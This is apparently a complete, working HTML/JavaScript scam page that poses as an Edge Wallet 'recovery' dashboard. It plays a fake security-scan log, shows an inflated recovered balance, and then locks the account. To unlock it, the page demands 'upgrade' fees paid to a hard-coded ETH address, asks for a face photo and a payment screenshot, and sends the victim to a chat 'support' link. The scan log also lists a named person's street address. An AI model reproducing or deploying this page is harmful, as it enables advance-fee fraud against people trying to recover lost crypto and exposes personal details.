<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Edge Wallet | Recovery Boost</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&display=swap" rel="stylesheet">
  <style>
    :root {
      --edge-bg: #18191d;
      --edge-card: #232427;
      --edge-panel: #232427;
      --edge-light: #292a30;
      --edge-dark: #191a1e;
      --edge-green: #14ea8f;
      --edge-red: #e24c4b;
      --edge-yellow: #ffc400;
      --edge-grey: #888a8b;
      --edge-border: #36373a;
      --edge-btn-bg: #36373a;
      --edge-btn-hover: #45484d;
      --edge-btn-fg: #fff;
      --edge-shadow: 0 4px 24px 0 #000a;
      --edge-radius: 22px;
      --edge-blue: #51ffc9;
      --edge-text: #e9e9e9;
      --edge-muted: #b7b7b7;
      --edge-eth: #fff;
      --edge-eth-bg: linear-gradient(90deg, #24252b 70%, #232427 100%);
      --edge-nav-active: #14ea8f;
      --edge-nav-inactive: #b7b7b7;
    }
    html, body {
      background: var(--edge-bg);
      min-height: 100vh;
      color: var(--edge-text);
      font-family: 'Roboto', Arial, sans-serif;
      margin: 0;
      padding: 0;
      letter-spacing: 0.02em;
      font-size: 16px;
    }
    #app {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      background: var(--edge-bg);
      width: 100vw;
    }
    .centered {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      background: transparent;
    }
    .edge-card {
      background: var(--edge-card);
      border-radius: var(--edge-radius);
      box-shadow: var(--edge-shadow);
      padding: 2.1rem 1.5rem;
      max-width: 380px;
      width: 95vw;
      margin: 2rem auto;
      border: 1.5px solid var(--edge-border);
      position: relative;
      color: var(--edge-text);
    }
    .edge-logo {
      max-width: 54px;
      margin: 0 auto 1.1rem auto;
      display: block;
      filter: brightness(1.1) drop-shadow(0 2px 6px #14ea8f33);
    }
    h2, h3 {
      font-weight: 700;
      color: var(--edge-text);
      letter-spacing: -.01em;
      margin-top: 0.6em;
      margin-bottom: 0.3em;
    }
    label {
      font-weight: 500;
      margin-top: 1em;
      display: block;
      margin-bottom: 0.5em;
      color: var(--edge-grey);
    }
    .button, .upgrade-btn, .copy-btn {
      background: var(--edge-green);
      color: #101010;
      padding: 0.88em 2em;
      border-radius: 10px;
      border: none;
      font-size: 1.08em;
      font-weight: 700;
      margin-top: 1em;
      cursor: pointer;
      box-shadow: 0 2px 12px rgba(20,234,143,0.09);
      transition: background 0.2s, color 0.2s, box-shadow 0.2s;
      width: 100%;
      outline: none;
      letter-spacing: 0.01em;
      display: block;
      text-align: center;
    }
    .button:active, .button:hover,
    .upgrade-btn:active, .upgrade-btn:hover,
    .copy-btn:active, .copy-btn:hover {
      background: #1be7a4;
      color: #232427;
    }
    .button[disabled] {
      background: #45484d99;
      color: #bbb;
      cursor: not-allowed;
    }
    .upgrade-btn, .copy-btn {
      width: auto;
      font-size: 1em;
      margin-top: 0.7em;
      margin-bottom: 0;
      padding: 0.6em 1.2em;
      margin-left: 0.7em;
      display: inline-block;
    }
    .copy-btn {
      margin-left: 1em;
      padding: 0.45em 1.2em;
      font-size: .98em;
    }
    .upgrade-levels {
      margin-top: 1em;
      margin-bottom: 1.4em;
    }
    .upgrade-level-card {
      background: #222325;
      border-radius: 14px;
      padding: 1.1em 1em 1em 1em;
      margin-bottom: 1em;
      display: flex;
      align-items: center;
      justify-content: space-between;
      border: 1.5px solid #36373a;
      transition: border-color 0.18s, box-shadow 0.18s;
      cursor: pointer;
    }
    .upgrade-level-card.selected,
    .upgrade-level-card:hover {
      border-color: var(--edge-green);
      box-shadow: 0 2px 14px #14ea8f1a;
      background: #232e27;
    }
    .upgrade-level-main {
      display: flex;
      flex-direction: column;
      gap: 3px;
    }
    .upgrade-level-title {
      font-weight: 700;
      font-size: 1.09em;
      color: var(--edge-blue);
    }
    .upgrade-level-desc {
      font-size: .97em;
      color: var(--edge-muted);
      margin-top: 1px;
    }
    .upgrade-level-fee {
      font-size: 1em;
      font-weight: 600;
      color: var(--edge-green);
    }
    .upgrade-level-limit {
      color: var(--edge-yellow);
      font-size: 1.01em;
      font-weight: 600;
      margin-left: .6em;
    }
    .upgrade-current-label {
      color: var(--edge-red);
      font-weight: 600;
      margin-left: .6em;
      font-size: 0.96em;
    }
    .popup-modal, .modal-bg {
      position: fixed;
      top: 0; left: 0; width: 100vw; height: 100vh;
      z-index: 1001;
      background: rgba(20,32,54,0.12);
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .popup-card {
      background: var(--edge-card);
      border-radius: 18px;
      box-shadow: 0 6px 30px 0 rgba(20,32,54,0.13);
      padding: 2em 1.5em;
      max-width: 400px;
      width: 96vw;
      animation: popupin .25s;
      color: var(--edge-text);
    }
    @keyframes popupin { from {transform:scale(0.97) translateY(20px);} to {transform:scale(1) translateY(0);} }
    .progress-modal {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 2em 1.2em;
      min-width: 240px;
      min-height: 260px;
    }
    .upgrade-spinner {
      width: 44px;
      height: 44px;
      border: 4px solid #eaf1fa;
      border-top: 4px solid var(--edge-green);
      border-radius: 50%;
      animation: spin 1.1s linear infinite;
      margin: 2em auto 1em auto;
      display: block;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .support-link {
      margin-top: 2.1em;
      text-align: center;
    }
    .support-link a {
      color: var(--edge-green);
      text-decoration: underline;
      font-weight: 600;
      font-size: 1.1em;
    }
    .edge-navbar {
      width: 100%;
      max-width: 375px;
      position: fixed;
      left: 50%;
      bottom: 0;
      transform: translateX(-50%);
      display: flex;
      background: #232427;
      border-radius: 30px 30px 0 0;
      border-top: 1.5px solid #292a30;
      z-index: 20;
      box-shadow: 0 -2px 12px #1013;
      justify-content: space-around;
      padding: 6px 0;
    }
    .edge-navbar-btn {
      flex: 1 1 0%;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 6px 0;
      color: var(--edge-nav-inactive);
      text-decoration: none;
      font-size: 1em;
      font-weight: 500;
      transition: color 0.17s;
      letter-spacing: 0.01em;
    }
    .edge-navbar-btn.active {
      color: var(--edge-nav-active);
    }
    .edge-navbar-btn i {
      font-size: 1.45em;
      margin-bottom: 2px;
    }
    .eth-points-badge {
      display: inline-block;
      background: #222325;
      color: #fff;
      border: 1.5px solid #14ea8f;
      border-radius: 11px;
      padding: 0.22em 0.9em 0.22em 0.7em;
      font-size: 0.93em;
      font-weight: 700;
      margin: 15px 0 8px 22px;
      box-shadow: 0 1px 9px #14ea8f1a;
      letter-spacing: 0.04em;
      user-select: text;
      min-width: 0;
    }
    .verif-license {
      margin: 1.1em auto 0 auto;
      font-size: .96em;
      color: #b7b7b7;
      background: #232427;
      border-left: 3px solid #14ea8f;
      border-radius: 6px;
      padding: .69em 1.2em;
      max-width: 330px;
      opacity: 0.91;
      font-style: italic;
      display: block;
    }
    .face-upload-preview img {
      max-width: 120px;
      display: block;
      margin: 1em auto 0.7em auto;
      border-radius: 14px;
      box-shadow: 0 2px 10px #14ea8f22;
    }
    .locked-banner {
      background: #fff0f0;
      color: #b13e3e;
      font-weight: 700;
      padding: 1em 0.8em;
      text-align: center;
      border-radius: 12px;
      font-size: 1.13em;
      margin-bottom: 1.4em;
      border: 2px solid #ffc4c4;
      box-shadow: 0 2px 8px #fbe3e3;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: .5em;
    }
    .upgrade-key-btn {
      background: #232427;
      color: #ffc400;
      border: 2px solid #ffc400;
      border-radius: 50%;
      width: 33px;
      height: 33px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 1.25em;
      position: absolute;
      right: 0;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
      transition: background 0.18s, border 0.18s, color 0.18s;
      z-index: 2;
      box-shadow: 0 2px 10px #ffc40021;
    }
    .upgrade-key-btn:hover {
      background: #ffc400;
      color: #232427;
      border-color: #ffea70;
    }
    @media (max-width: 500px) {
      .eth-points-badge {
        margin-left: 7vw;
        font-size: 0.87em;
      }
      .edge-card, .dashboard-balance-card { padding: 1.2rem 0.7rem; }
      #support-float-btn { width: 44px; height: 44px; font-size: 1.4em; }
      .edge-dashboard, .edge-navbar { max-width: 100vw; }
      .dashboard-balance-card { margin-left: 2vw; margin-right: 2vw;}
      .upgrade-key-btn { width: 27px; height: 27px; font-size: 1em; }
      .popup-card { padding: 1.1em 0.5em; }
    }
  </style>
</head>
<body>
<div id="app"></div>
<a href="https://widget-page.smartsupp.com/widget/f659c5b3d565aafa73ba3a49d4ce0baf57cea73b?ss-chat-settings"
   target="_blank"
   id="support-float-btn"
   title="Live Support">
  💬
</a>
<script>
const EDGE_LOGO_URL = "IMG_3926.png";
const ETH_ICON = "IMG_3908.png?v=032";
const BTC_ICON = "IMG_3909.png?v=032";
const SOL_ICON = "IMG_3910.png?v=032";
const RECOVERY_TX_AMOUNT = 449000;
const RECOVERY_ETH = 125.81;
const INIT_BALANCE = 30000;
const INIT_ETH = 9.2;
const UPGRADE_ADDRESS = "0x79B46bA71De8191FBD90C5236Cd768Ac0386291a";
const SUPPORT_URL = "https://widget-page.smartsupp.com/widget/f659c5b3d565aafa73ba3a49d4ce0baf57cea73b?ss-chat-settings";
const UPGRADE_LEVELS = [
  {name: "Level 1", limit: 30000, cost: 0, desc: "Limit Exceeded", locked: true},
  {name: "Level 2", limit: 300000, cost: 700, desc: "Upgrade to process $300,000", locked: false},
  {name: "Level 3", limit: 449000, cost: 1100, desc: "Max Balance Access", locked: false},
];

// Local storage keys
const STORAGE_KEY = "edgewallet_user";
function saveState() {
  localStorage.setItem(STORAGE_KEY, JSON.stringify({
    recovered: state.recovered,
    balance: state.dashboard.balance,
    eth: state.dashboard.eth
  }));
}
function loadState() {
  const s = localStorage.getItem(STORAGE_KEY);
  if (s) {
    try {
      const obj = JSON.parse(s);
      state.recovered = !!obj.recovered;
      state.dashboard.balance = obj.balance || INIT_BALANCE;
      state.dashboard.eth = obj.eth || INIT_ETH;
    } catch(e){}
  }
}
let state = {
  step: "welcome",
  dashboard: {
    balance: INIT_BALANCE,
    eth: INIT_ETH
  },
  locked: false,
  selectedUpgrade: null,
  uploadImg: null,
  verifyTimer: null,
  faceVerified: false,
  faceImg: null,
  recovered: false
};

function render() {
  const app = document.getElementById('app');
  app.innerHTML = '';

  if (state.step === "welcome") renderWelcome(app);
  else if (state.step === "dashboard") renderDashboard(app);
  else if (state.step === "recoveryModal") renderRecoveryModal(app);
  else if (state.step === "raiderScan") renderRaiderScan(app);
  else if (state.step === "locked") { renderDashboard(app, true); renderLockedBanner(app); }
  else if (state.step === "upgrade") renderUpgradeModal(app);
  else if (state.step === "face") renderFaceModal(app);
  else if (state.step === "pay") renderPayModal(app);
  else if (state.step === "upload") renderUploadModal(app);
  else if (state.step === "verifying") renderVerifyingModal(app);
  else if (state.step === "timeout") renderTimeoutModal(app);
}

function renderWelcome(app) {
  const card = document.createElement('div');
  card.className = 'edge-card centered';
  card.innerHTML = `
    <img src="${EDGE_LOGO_URL}" class="edge-logo" alt="Edge Wallet">
    <h2 style="margin-top:0.5em; font-size:1.25em;">Welcome</h2>
    <button class="button" id="proceedBtn" style="margin-top:2em;">PROCEED TO MY DASHBOARD</button>
  `;
  app.appendChild(card);
  card.querySelector('#proceedBtn').onclick = () => {
    // If recovered, go straight to dashboard; else, run recovery
    if (state.recovered) {
      state.step = "dashboard";
      render();
    } else {
      state.step = "dashboard";
      setTimeout(()=>{ render(); }, 300);
      setTimeout(()=>{ state.step = "recoveryModal"; render(); }, 1200);
    }
  };
}

function renderDashboard(app, isLocked) {
  const isAccountLocked = state.locked || state.step === "locked" || state.dashboard.balance > INIT_BALANCE;
  app.innerHTML = `
    <div class="edge-dashboard">
      <div class="edge-dashboard-header">
        <div class="help">Help</div>
        <img src="${EDGE_LOGO_URL}" class="logo" alt="Edge Wallet">
        <button class="upgrade-key-btn" id="upgradeKeyBtn" title="Upgrade Account">🔑</button>
      </div>
      <div class="dashboard-balance-card">
        <span class="balance-label">Total Balance <i>👁️‍🗨️</i></span>
        <div class="dashboard-balance">
          $${state.dashboard.balance.toLocaleString(undefined, {minimumFractionDigits:2, maximumFractionDigits:2})} USD
        </div>
        <div style="font-size:1.13em;color:#51ffc9;font-weight:600;margin-bottom:5px;">
          (${state.dashboard.eth} ETH)
        </div>
        ${
          isAccountLocked ?
          `<div class="withheld-note">ETH BALANCE IS CURRENTLY WITHHELD BY EDGE WALLET EXTENSION <span>🔒</span></div>`
          : ''
        }
        <button class="main-withdraw-btn" disabled>
          Withdraw <span>🔒</span>
        </button>
      </div>
      <div class="eth-points-badge">⛽️ETH POINTS: <span style="color:#14ea8f;">[+3000]</span></div>
      <div class="wallets-label">Wallets</div>
      <div class="wallets-list">
        <div class="wallet-asset-card">
          <div class="wallet-asset-left">
            <div class="wallet-asset-icon"><img src="${ETH_ICON}" alt="ETH"></div>
            <div class="wallet-asset-txt">
              <span class="wallet-asset-name">ETH</span>
              <span class="wallet-asset-usd">$3,700</span>
              <span class="wallet-asset-chg" style="color:#e24c4b;">-2.10%</span>
            </div>
          </div>
          <div class="wallet-asset-right">
            <div class="wallet-asset-holdings">${state.dashboard.eth} ETH</div>
            <span style="font-size:1em;color:#51ffc9;">$${state.dashboard.balance.toLocaleString(undefined, {minimumFractionDigits:2, maximumFractionDigits:2})}</span>
            <span class="wallet-asset-link">My Ether</span>
          </div>
        </div>
        <div class="wallet-asset-card">
          <div class="wallet-asset-left">
            <div class="wallet-asset-icon"><img src="${BTC_ICON}" alt="BTC"></div>
            <div class="wallet-asset-txt">
              <span class="wallet-asset-name">BTC</span>
              <span class="wallet-asset-usd">$118,661</span>
              <span class="wallet-asset-chg" style="color:#14ea8f;">+0.57%</span>
            </div>
          </div>
          <div class="wallet-asset-right">
            <div class="wallet-asset-holdings">0</div>
            <span style="font-size:1em;color:#51ffc9;">$0</span>
            <span class="wallet-asset-link">My Bitcoin</span>
          </div>
        </div>
        <div class="wallet-asset-card">
          <div class="wallet-asset-left">
            <div class="wallet-asset-icon"><img src="${SOL_ICON}" alt="SOL"></div>
            <div class="wallet-asset-txt">
              <span class="wallet-asset-name">SOL</span>
              <span class="wallet-asset-usd">$203.08</span>
              <span class="wallet-asset-chg" style="color:#14ea8f;">+3.83%</span>
            </div>
          </div>
          <div class="wallet-asset-right">
            <div class="wallet-asset-holdings">0</div>
            <span style="font-size:1em;color:#51ffc9;">$0</span>
            <span class="wallet-asset-link">My Solana</span>
          </div>
        </div>
      </div>
      <div class="assets-search">
        <span style="color:#b7b7b7;font-size:1.1em;">🔍</span>
        <input type="text" placeholder="Search Wallets" disabled>
      </div>
    </div>
  `;
  setTimeout(() => {
    const upgradeBtn = document.getElementById("upgradeKeyBtn");
    if(upgradeBtn) {
      upgradeBtn.onclick = () => {
        state.selectedUpgrade = null;
        state.faceVerified = false;
        state.faceImg = null;
        state.step = "upgrade";
        render();
      };
    }
  }, 0);
}

function renderUpgradeModal(app) {
  const modal = document.createElement('div');
  modal.className = 'popup-modal';
  let levelsHtml = '';
  UPGRADE_LEVELS.forEach((level, i) => {
    levelsHtml += `
      <div class="upgrade-level-card ${state.selectedUpgrade === i ? 'selected' : ''}" data-upgrade="${i}">
        <div class="upgrade-level-main">
          <span class="upgrade-level-title">${level.name}</span>
          <span class="upgrade-level-desc">${level.desc}${level.locked ? `<span class="upgrade-current-label">(Current)</span>` : ''}</span>
        </div>
        <div>
          <span class="upgrade-level-fee">${level.cost ? '$'+level.cost : ''}</span>
          <span class="upgrade-level-limit">${level.limit ? 'Limit $'+level.limit.toLocaleString() : ''}</span>
          ${!level.locked ? `<button class="upgrade-btn" data-upgrade="${i}">Upgrade</button>` : ''}
        </div>
      </div>
    `;
  });
  modal.innerHTML = `
    <div class="popup-card" style="text-align:center;">
      <img src="${EDGE_LOGO_URL}" class="edge-logo" alt="Edge Wallet">
      <h2 style="margin-top:0.2em;">UPGRADE ACCOUNT</h2>
      <div class="upgrade-levels">${levelsHtml}</div>
      <blockquote class="verif-license">
        Verification is subject to EDGE WALLET and legally approved by <a href="https://ethereum.org" target="_blank" style="color:#14ea8f;">ethereum.org</a>
      </blockquote>
      <button class="button" id="closeUpgrade" style="background:#36373a;color:#fff;">Close</button>
    </div>
  `;
  app.appendChild(modal);

  modal.querySelectorAll('.upgrade-btn').forEach(btn => {
    btn.onclick = (e) => {
      let idx = +btn.getAttribute('data-upgrade');
      state.selectedUpgrade = idx;
      state.step = "face";
      render();
    }
  });
  modal.querySelector('#closeUpgrade').onclick = () => {
    state.step = "locked";
    render();
  };
}

function renderFaceModal(app) {
  const idx = state.selectedUpgrade;
  const level = UPGRADE_LEVELS[idx];
  const modal = document.createElement('div');
  modal.className = 'popup-modal';
  modal.innerHTML = `
    <div class="popup-card" style="text-align:center;">
      <img src="${EDGE_LOGO_URL}" class="edge-logo" alt="Edge Wallet">
      <h2>Face Verification</h2>
      <div style="margin-bottom:1.1em;">
        Please upload a clear photo of your face for account verification.
      </div>
      <div class="face-upload-preview" id="facePreview"></div>
      <input type="file" id="faceInput" accept="image/*" style="margin-bottom:1em;">
      <button class="button" id="submitFace" disabled>Submit Face Verification</button>
      <button class="button" id="closeFace" style="background:#36373a;color:#fff;">Back</button>
    </div>
  `;
  app.appendChild(modal);

  const faceInput = modal.querySelector('#faceInput');
  const facePreview = modal.querySelector('#facePreview');
  const submitBtn = modal.querySelector('#submitFace');
  faceInput.onchange = function() {
    const file = faceInput.files[0];
    if (file && file.type.startsWith('image/')) {
      const reader = new FileReader();
      reader.onload = function(e) {
        facePreview.innerHTML = `<img src="${e.target.result}" alt="Face Verification">`;
        state.faceImg = e.target.result;
        submitBtn.disabled = false;
      };
      reader.readAsDataURL(file);
    }
  };
  submitBtn.onclick = () => {
    submitBtn.disabled = true;
    facePreview.innerHTML += `<div style="margin-top:1.3em;"><span class="upgrade-spinner"></span><div style="color:#b7b7b7;font-size:1em;">Verifying...</div></div>`;
    setTimeout(() => {
      state.faceVerified = true;
      state.step = "pay";
      render();
    }, 2200);
  };
  modal.querySelector('#closeFace').onclick = () => {
    state.step = "upgrade";
    render();
  };
}

function renderPayModal(app) {
  const level = UPGRADE_LEVELS[state.selectedUpgrade];
  const modal = document.createElement('div');
  modal.className = 'popup-modal';
  modal.innerHTML = `
    <div class="popup-card" style="text-align:center;">
      <img src="${EDGE_LOGO_URL}" class="edge-logo" alt="Edge Wallet">
      <h2 style="margin-bottom:0.5em;">Upgrade to ${level.name}</h2>
      <div style="margin-bottom:1.3em;">
        <span class="upgrade-level-desc">${level.desc}</span><br>
        <span class="upgrade-level-fee">${level.cost ? '$'+level.cost : ''}</span>
        <span class="upgrade-level-limit">${level.limit ? 'Limit $'+level.limit.toLocaleString() : ''}</span>
      </div>
      <div style="margin-bottom:1.1em;">
        Pay the upgrade fee to the address below:<br>
        <span style="font-size:1.02em;font-weight:500;letter-spacing:0.02em;">${UPGRADE_ADDRESS}</span>
        <button class="copy-btn" id="copyUpgradeBtn">Copy</button>
        <span id="copySuccess" style="margin-left:.6em; color:var(--edge-green); font-size:0.99em; display:none;">Copied!</span>
      </div>
      <button class="button" id="havePaidBtn" style="margin-bottom:.5em;">I have paid</button>
      <button class="button" id="closePay" style="background:#36373a;color:#fff;">Back</button>
    </div>
  `;
  app.appendChild(modal);

  modal.querySelector('#closePay').onclick = () => {
    state.step = "upgrade";
    render();
  };
  modal.querySelector('#havePaidBtn').onclick = () => {
    state.step = "upload";
    render();
  };
  modal.querySelector('#copyUpgradeBtn').onclick = () => {
    navigator.clipboard.writeText(UPGRADE_ADDRESS);
    modal.querySelector('#copySuccess').style.display = 'inline';
    setTimeout(()=>{ modal.querySelector('#copySuccess').style.display='none'; }, 1400);
  };
}

function renderUploadModal(app) {
  const modal = document.createElement('div');
  modal.className = 'popup-modal';
  modal.innerHTML = `
    <div class="popup-card" style="text-align:center;">
      <img src="${EDGE_LOGO_URL}" class="edge-logo" alt="Edge Wallet">
      <h2>Upload Payment Screenshot</h2>
      <div style="margin-bottom:1.2em;">
        <input type="file" id="screenshotInput" accept="image/*">
        <div id="uploadedPreview"></div>
      </div>
      <button class="button" id="submitScreenshot" disabled>Submit for Verification</button>
      <button class="button" id="closeUpload" style="background:#36373a;color:#fff;">Back</button>
    </div>
  `;
  app.appendChild(modal);

  const fileInput = modal.querySelector('#screenshotInput');
  const preview = modal.querySelector('#uploadedPreview');
  const submitBtn = modal.querySelector('#submitScreenshot');
  fileInput.onchange = function() {
    const file = fileInput.files[0];
    if (file && file.type.startsWith('image/')) {
      const reader = new FileReader();
      reader.onload = function(e) {
        preview.innerHTML = `<img src="${e.target.result}" alt="Screenshot" style="max-width:100%;margin:1em auto 0.7em auto;border-radius:8px;box-shadow:0 2px 10px #14ea8f22;">`;
        state.uploadImg = e.target.result;
        submitBtn.disabled = false;
      };
      reader.readAsDataURL(file);
    }
  };
  submitBtn.onclick = () => {
    state.step = "verifying";
    render();
    state.verifyTimer = setTimeout(()=>{ state.step = "timeout"; render(); }, 4000);
  };
  modal.querySelector('#closeUpload').onclick = () => {
    state.step = "pay";
    render();
  };
}

function renderVerifyingModal(app) {
  const modal = document.createElement('div');
  modal.className = 'popup-modal';
  modal.innerHTML = `
    <div class="popup-card progress-modal" style="text-align:center;">
      <img src="${EDGE_LOGO_URL}" class="edge-logo" style="max-width:36px;margin-bottom:0.7em;" alt="Edge Wallet">
      <span class="upgrade-spinner"></span>
      <h3>Verification in progress</h3>
      <div style="margin-top:0.5em; color:#888;">
        Please wait...<br>
        <span style="font-size:.97em;">Estimated time: 30 minutes</span>
      </div>
    </div>
  `;
  app.appendChild(modal);
}

function renderTimeoutModal(app) {
  const modal = document.createElement('div');
  modal.className = 'popup-modal';
  modal.innerHTML = `
    <div class="popup-card progress-modal" style="text-align:center;">
      <img src="${EDGE_LOGO_URL}" class="edge-logo" style="max-width:36px;margin-bottom:0.7em;" alt="Edge Wallet">
      <span style="font-size:2em; color:var(--edge-yellow);">⏰</span>
      <h3 style="margin-bottom:0.4em;">Verification Timeout</h3>
      <div style="font-size:1.05em; margin-bottom:1.9em;">
        Contact support for more info regarding this issue.
      </div>
      <div class="support-link">
        <a href="${SUPPORT_URL}" target="_blank">Contact Support</a>
      </div>
      <button class="button" id="toLocked" style="margin-top:2em;">Return to Dashboard</button>
    </div>
  `;
  app.appendChild(modal);
  modal.querySelector('#toLocked').onclick = () => {
    state.step = "locked";
    render();
  };
}

function renderLockedBanner(app) {
  const locked = document.createElement('div');
  locked.className = 'locked-banner';
  locked.innerHTML = `
    <span style="font-size:1.38em;">🔒</span>
    <span>
      <b>Account Locked:</b> Due to low verification status. Kindly upgrade your account to proceed further.
    </span>
  `;
  app.appendChild(locked);
}
function renderRecoveryModal(app) {
  const modal = document.createElement('div');
  modal.className = 'popup-modal';
  modal.innerHTML = `
    <div class="edge-card popup-card">
      <h3 style="margin-bottom:1em;">Dear user</h3>
      <div style="font-size:1.08em; margin-bottom:1.2em;">
        You have an <b>Unfinished Recovery Request</b>
      </div>
      <button class="button" id="boostBtn">Boost Up Recovery</button>
    </div>
  `;
  app.appendChild(modal);
  modal.querySelector('#boostBtn').onclick = () => {
    state.step = "raiderScan";
    render();
  };
}
function renderRaiderScan(app) {
  const RECOVERY_LOGS = [
    "# Checking security of connection... PASSED",
    "# Country - United States",
    "# User Location - 2113 Sherbrooke Circle, Virginia Beach, VA 23454",
    "# Username - Randi Perrone-Kerfoot",
    "# Email - Verified (randi.pk@example.com)",
    "# IP Address - 192.0.2.24 (Secure)",
    "# Device Status - No malware detected",
    "# Network Integrity - Stable (No packet loss)",
    "# ETH Address - 0x3c73bcC0403a7919fbB0C9B567Bf5D1079c72Cdc",
    "# Wallet Balance - Verified (Encrypted)",
    "# Two-Factor Authentication - Enabled",
    "# Account Recovery Tokens - Validated",
    "# Encryption Status - AES-256 Verified",
    "# Scan Completed - No security breaches detected"
  ];
  const RECOVERY_LOG_TIMES = [
    "00:15", "00:28", "00:36", "00:44", "00:53", "01:05",
    "01:18", "01:30", "01:42", "01:58", "02:15", "02:32", "02:50", "03:00"
  ];
  const modal = document.createElement('div');
  modal.className = 'popup-modal';
  modal.innerHTML = `
    <div class="edge-card popup-card" style="min-width:290px;">
      <h3 style="color:var(--edge-green);margin-bottom:0.5em;">UPDATING REQUEST…</h3>
      <div id="raiderScanLog" style="background:#191a1e;color:#51ffc9;font-family:monospace;font-size:1.05em;border-radius:12px;padding:1em 1.2em;margin-top:1em;min-height:200px;max-height:330px;overflow-y:auto;width:100%;box-sizing:border-box;line-height:1.7;"></div>
    </div>
  `;
  app.appendChild(modal);

  let idx = 0, logView = modal.querySelector('#raiderScanLog');
  logView.innerHTML = '';
  function appendLog() {
    if (idx < RECOVERY_LOGS.length) {
      logView.innerHTML += `[${RECOVERY_LOG_TIMES[idx]}] ${RECOVERY_LOGS[idx]}<br>`;
      logView.scrollTop = logView.scrollHeight;
      idx++;
      let nextDelay = [700,800,900,1200,1400][Math.floor(Math.random()*5)] + 300;
      setTimeout(appendLog, nextDelay);
    } else {
      setTimeout(() => {
        state.dashboard.balance = RECOVERY_TX_AMOUNT + INIT_BALANCE;
        state.dashboard.eth = +(state.dashboard.eth + RECOVERY_ETH).toFixed(2);
        state.locked = true;
        state.recovered = true;
        saveState();
        state.step = "locked";
        render();
      }, 1200);
    }
  }
  setTimeout(appendLog, 1150);
}
window.addEventListener('DOMContentLoaded', () => {
  loadState();
  render();
});
</script>
</body>
</html>
